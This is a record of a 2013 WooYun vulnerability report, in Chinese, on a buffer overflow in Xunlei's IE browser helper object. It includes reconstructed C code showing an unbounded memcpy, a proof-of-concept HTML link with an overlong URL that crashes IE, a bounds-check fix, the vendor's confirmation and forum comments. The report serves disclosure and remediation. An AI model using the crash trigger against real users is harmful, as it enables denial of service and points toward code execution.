{"id": 11476, "wybug_id": "wooyun-2013-021951", "wybug_title": "迅雷BHO组件对缓冲区边界控制不严导致缓冲区溢出", "wybug_corp": "迅雷", "wybug_author": "叉叉", "wybug_date": "2013-04-16 10:13", "wybug_open_date": "2013-07-15 10:14", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["浏览器扩展", "控件", "边界越位", "浏览器插件漏洞", "漏洞", "浏览器漏洞利用技巧", "远程拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-06-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-15：\t细节向公众公开  简要描述： 在测试公司Javascript脚本时，发现IE会时常崩溃了解测试环境后，发现所有测试人的电脑上都装了迅雷……所以打开调试器简单调了一下，发现崩溃时栈回溯的根源在迅雷BHO组件由于某函数没有正确判断缓冲区边界，导致了内存泄漏，而此函数参数可控、可完全重现再详细就不说了，提一个字就都知道了……以免被有心人利用 详细说明：  环境：迅雷VIP版，BHO组件名称XunleiBHO7.3.9.218.dllIE10在测试浏览器支持HTML的a标签href属性最大长度时，发现IE时常会崩溃，在了解测试环境后，发现所有测试人电脑上都有安装迅雷7或VIP版本，简单调了一下，发现在点击如下类型的超级链接时\n<a href=\"{超长URL}\">Test</a>\nIE直接崩溃，在栈回溯中，发现是在迅雷BHO组件处引起IE崩溃根据IDA反汇编和猜想，将问题函数还原成C代码后，发现此文件中的214416FA函数中对缓冲区边界的判断非常……稍微有点编程经验的都不会犯这种错误有木有……：\n#define BUFSIZE 4170void __stdcall sub_214416FA(const wchar_t *wszUrl, int Mode){\tHANDLE hMapFile; //文件映射句柄\tvoid *pBuf; //文件映射缓冲区区\tsize_t nSrcLen; //字符串参数wszSrc的长度\tif ( Mode == 1 || Mode == 2 )\t{\t\thMapFile = OpenFileMappingW(FILE_MAP_ALL_ACCESS, 0, L\"ShielDownUrl\");\t\tif ( hMapFile || (hMapFile = CreateFileMappingW(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, BUFSIZE, L\"ShielDownUrl\")) != 0 )\t\t{\t\t\tpBuf = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);\t\t\t//创建了一个大小为4170字节的文件映射，且模式为FILE_MAP_ALL_ACCESS，而此模式允许在映射的缓冲区中执行任意代码\t\t\tif ( pBuf )\t\t\t{\t\t\t\tmemset(pBuf, 0, BUFSIZE);\t\t\t\t//清空文件缓冲区，一直到这里除了FILE_MAP_ALL_ACCESS模式以外并无高危代码\t\t\t\tnSrcLen = wcslen(wszUrl);\t\t\t\t//计算wszSrc参数的长度\t\t\t\t\t\t\t\tmemcpy(pBuf, wszUrl, 2 * nSrcLen);\t\t\t\t//在这里才发生了恐怖的事，文件映射缓冲区大小限制为4170字节，而执行内存拷贝函数时，并没有考虑到4170大小的限制\t\t\t\t//如果wszSrc长度大于4170，则nSrcLen大于4170，超出文件映射缓冲区边界，我在这里传入了近8000个字符的长度的URL\t\t\t\t//直接导致BHO组件崩溃，而IE也被连带崩溃\t\t\t\t//如果在4170字节后，自己构造OPCODE缓冲区，在FILE_MAP_ALL_ACCESS的帮助下，就可能达到意想不到的结果\t\t\t\t//请引以为戒\t\t\t\tUnmapViewOfFile(pBuf);\t\t\t}\t\t}\t}}\n   漏洞证明：  将下面的代码存为xxx.html，然后用安装了迅雷的IE打开：\n<a href=\"https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com\">Test</a>\n点击Test链接，IE崩溃，只演示崩溃，带OPCODE的就不贴了   修复方案：  严格处理缓冲区边界，我相信你们也知道这是低级错误\nmemset(pBuf, 0, BUFSIZE);nSrcLen = wcslen(wszUrl);//BEGEN 多判断一下nSrcLen就可以了if (nSrcLen < BUF_SIZE)    memcpy(pBuf, wszUrl, 2 * nSrcLen);else    [错误处理]\n   版权声明：转载请注明来源 叉叉@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-04-19 10:39 厂商回复： BHO团队已经在处理了，非常感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-16 10:18 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  嘿，我崇拜你来了    \n     2013-04-16 10:21 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  @心伤的瘦子 路人甲你葱白毛    \n     2013-04-16 10:31 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:81        | 三人行必有我师焉########################...)\t\t \n  这名叫的！又是哪位大神呀！不会是你吧 @心伤的瘦子    \n     2013-04-16 10:34 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  最近神仙出没比较多......    \n     2013-04-16 12:56 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  来膜拜下    \n     2013-04-16 13:39 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  叉叉来了，估计 欧欧 也快来了。    \n     2013-04-16 16:03 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  XXOO    \n     2013-04-17 11:18 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  @xsser 是不是emxxxxx溢出哥的马甲。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}